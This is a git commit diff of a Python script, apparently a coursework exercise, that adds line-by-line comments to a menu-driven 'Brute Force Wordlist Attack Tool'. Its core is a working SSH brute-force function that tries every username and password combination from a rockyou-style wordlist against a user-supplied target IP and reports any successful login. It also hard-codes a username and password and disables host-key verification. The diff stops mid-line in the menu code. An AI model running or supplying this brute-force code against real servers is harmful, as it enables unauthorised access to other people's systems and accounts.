712bd33d42baa3932d1e81a45e3d5e4bc84cc2f5
KevinVanHoang <hoang.kevin67@gmail.com>
2024-01-31 07:56:03 -0800

    Add ops17.py

--- ops17.py
+++ ops17.py
@@ -15,89 +15,87 @@ import paramiko
 import time
 import ssl
 
-
 # Function which connects to SSH server, executes command, captures output, prints command and output. Writes output to a file and returns output file name.
 def paramiko_GKG(hostname, command, output_file):
     print('running')
     try:
-        port = '22'
-        client = paramiko.SSHClient()
-        client.load_system_host_keys()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(hostname, port=22, username='geeksForgeeks', password='geeksForgeeks')
-        (stdin, stdout, stderr) = client.exec_command(command)
-        cmd_output = stdout.read()
-        print('log printing: ', command, cmd_output)
-        with open(output_file, "w+") as file:
-            file.write(str(cmd_output))
-        return output_file
+        port = '22'  # SSH port
+        client = paramiko.SSHClient()  # Create SSH client object
+        client.load_system_host_keys()  # Load system host keys
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys
+        client.connect(hostname, port=22, username='geeksForgeeks', password='geeksForgeeks')  # Connect to SSH server
+        (stdin, stdout, stderr) = client.exec_command(command)  # Execute command on the server
+        cmd_output = stdout.read()  # Read command output
+        print('log printing: ', command, cmd_output)  # Print command and output
+        with open(output_file, "w+") as file:  # Open output file
+            file.write(str(cmd_output))  # Write output to file
+        return output_file  # Return output file name
     finally:
-        client.close()
+        client.close()  # Close SSH connection
 
 # Function performs a brute force ssh attack by searching through provided usernames and passwords, attempts to connect to an ssh server using combinations and prints results.
 def paramiko_GKG_bruteforce(hostname, usernames, passwords):
     print('Brute-force attack running')
     try:
-        port = '22'
-        client = paramiko.SSHClient()
-        client.load_system_host_keys()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        port = '22'  # SSH port
+        client = paramiko.SSHClient()  # Create SSH client object
+        client.load_system_host_keys()  # Load system host keys
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys
 
-        for username in usernames:
-            for password in passwords:
+        for username in usernames:  # Iterate over usernames
+            for password in passwords:  # Iterate over passwords
                 try:
-                    client.connect(hostname, port=22, username=username, password=password)
-                    print(f'Successful login: {username}@{hostname} with password: {password}')
-                    return True
+                    client.connect(hostname, port=22, username=username, password=password)  # Try to connect with given username and password
+                    print(f'Successful login: {username}@{hostname} with password: {password}')  # Print successful login message
+                    return True  # Return True indicating successful login
                 except paramiko.AuthenticationException:
-                    print(f'Failed login attempt: {username}@{hostname} with password: {password}')
+                    print(f'Failed login attempt: {username}@{hostname} with password: {password}')  # Print failed login attempt message
                 except Exception as e:
-                    print(f'Error: {e}')
+                    print(f'Error: {e}')  # Print any other errors
 
-        print('Brute-force attack completed. No valid credentials found.')
-        return False
+        print('Brute-force attack completed. No valid credentials found.')  # Print message if no valid credentials found
+        return False  # Return False indicating no valid credentials found
 
     finally:
-        client.close()
+        client.close()  # Close SSH connection
 
 # Function prompts user for dictionary file path, opens specified file, reads lines, removes trailing whitespaces. Assigns line to a varaible 'word'. Prints word to screen, introduces delay of second and repeats process until are lines in file are processed.
 def iterator():
-    filepath = input("Enter your dictionary filepath:\n")
-    file = open(filepath, encoding="ISO-8859-1")
-    line = file.readline()
-    while line:
-        line = line.rstrip()
-        word = line
-        print(word)
-        time.sleep(1)
-        line = file.readline()
-    file.close()
+    filepath = input("Enter your dictionary filepath:\n")  # Prompt user for file path
+    file = open(filepath, encoding="ISO-8859-1")  # Open file
+    line = file.readline()  # Read first line
+    while line:  # Loop until end of file
+        line = line.rstrip()  # Remove trailing whitespace
+        word = line  # Assign line to variable 'word'
+        print(word)  # Print word
+        time.sleep(1)  # Introduce delay of 1 second
+        line = file.readline()  # Read next line
+    file.close()  # Close file
 
 # Function takes a list of words as input, prompts user to enter word, checks if entered word is in provided list and prints corresponding message
 def check_for_word(words):
-    user_answer = input("Enter a word: ")
-    if user_answer in words:
-        print("The word is in the dictionary")
+    user_answer = input("Enter a word: ")  # Prompt user for input
+    if user_answer in words:  # Check if user input is in list of words
+        print("The word is in the dictionary")  # Print message if word is found
     else:
-        print("The word is not in the dictionary")
+        print("The word is not in the dictionary")  # Print message if word is not found
 
 # Function reads contents of file 'rockyou.txt' initializes an empty list named password_list, opens specified file in read mode, reads each line. removes trailing whitespaces. appends it to password_list, prints list and continues reading until end of file.
 def load_external_file():
-    password_list = []
-    with open('rockyou.txt', 'r') as file:
-        while True:
-            line = file.readline()
-            if not line:
-                break
-            line = line.rstrip()
-            password_list.append(line)
-            print(password_list)
-    return password_list
+    password_list = []  # Initialize empty list for passwords
+    with open('rockyou_sample.txt', 'r') as file:  # Open file 'rockyou.txt' in read mode
+        while True:  # Infinite loop
+            line = file.readline()  # Read line from file
+            if not line:  # If end of file is reached
+                break  # Exit loop
+            line = line.rstrip()  # Remove trailing whitespace
+            password_list.append(line)  # Append line to password_list
+            print(password_list)  # Print password_list
+    return password_list  # Return password_list
 
-
-# Main execution. Presents menu to user with options for different functions. Uses while loops to keep prompting until user exits. 
+# Main execution. Presents menu to user with options for different functions. Uses while loops to keep prompting until user exits.
 if __name__ == "__main__":
-    while True:
+    while True:  # Infinite loop
         mode = input("""
 Brute Force Wordlist Attack Tool Menu
 1 - Offensive, Dictionary Iterator
@@ -105,21 +103,13 @@ Brute Force Wordlist Attack Tool Menu
 3 - Defensive, Password Recognized
 4 - Exit
 Please enter a number: 
-""")
-        if mode == "1":
-            iterator()
-        elif mode == "2":
-            hostname = input("Enter the target IP address: ")
-            usernames = input("Enter a list of usernames (comma-separated): ").split(',')
-            passwords = load_external_file()
-            paramiko_GKG_bruteforce(hostname, usernames, passwords)
-        elif mode == "3":
-            word_list = load_external_file()
-            check_for_word(word_list)
-        elif mode == '4':
-            break
-        else:
-            print("Invalid selection...")
-
-
-# Done
+""")  # Prompt user for input
+        if mode == "1":  # If mode is 1
+            iterator()  # Call iterator function
+        elif mode == "2":  # If mode is 2
+            hostname = input("Enter the target IP address: ")  # Prompt user for target IP address
+            usernames = input("Enter a list of usernames (comma-separated): ").split(',')  # Prompt user for list of usernames
+            passwords = load_external_file()  # Load passwords from external file
+            paramiko_GKG_bruteforce(hostname, usernames, passwords)  # Call function for brute force SSH attack
+        elif mode == "3":  # If mode is 3
+            word_list = load_external_file
